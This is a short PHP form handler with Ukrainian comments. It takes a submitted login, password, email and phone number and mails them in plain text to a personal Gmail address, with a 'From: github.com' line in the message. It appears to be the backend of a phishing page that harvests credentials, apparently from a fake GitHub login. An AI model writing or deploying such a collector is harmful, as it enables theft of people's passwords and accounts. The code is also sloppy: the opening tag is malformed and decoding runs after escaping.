<?php>

//получим дані з елементів форми

$login = $_POST['login']; 
$pass = $_POST['pass'];
$email = $_POST['email'];
$tel = $_POST['tel'];


$login = htmlspecialchars($login);
$pass = htmlspecialchars($pass);
$email = htmlspecialchars($email);
$tel = htmlspecialchars($tel);

$login = urldecode($login);
$pass = urldecode($pass);
$email = urldecode($email);
$tel = urldecode($tel);

$login = trim($login);
$pass = trim($pass);
$email = trim($email);
$tel = trim($tel);


if (mail("homenkonazar5@gmail.com",
        "Нове повідомлення з сайту",
        "Логін: ".$login."\n".
        "Пароль: ".$pass."\n".
        "Email: ".$email."\n".
        "Мобільний: ".$tel."\n".
        "From: github.com \r\n")
        ){
            echo('Повідомлення відправлено!');
        }
        else{
            echo('Помилка!');
        }


?>